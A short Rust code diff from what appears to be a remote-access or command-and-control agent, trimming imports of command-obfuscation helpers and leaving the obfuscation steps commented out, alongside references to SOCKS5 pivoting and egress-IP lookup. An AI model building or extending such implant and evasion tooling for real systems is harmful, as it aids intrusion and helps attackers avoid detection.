@@ -1,4 +1,4 @@
-use crate::commands::obfuscated::{obfuscate_command, random_case, random_quote_insertion, random_char_insertion, xor_obfuscate};
+use crate::commands::obfuscated::{xor_obfuscate};
 use crate::config::AgentConfig;
 use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
@@ -386,7 +386,7 @@ pub async fn agent_loop(
                 // Queue check (moved earlier, simplified)
                 if !should_queue_command(&command) {
                     // If not queued, proceed to execute in BackgroundOpsec
-                    let mut obf_cmd = command.clone();
+                    let obf_cmd = command.clone();
                     // obf_cmd = random_case(&obf_cmd, 0.5); // TEMP DISABLED
                     // obf_cmd = random_quote_insertion(&obf_cmd, 0.3); // TEMP DISABLED
                     // obf_cmd = random_char_insertion(&obf_cmd, 0.2); // TEMP DISABLED
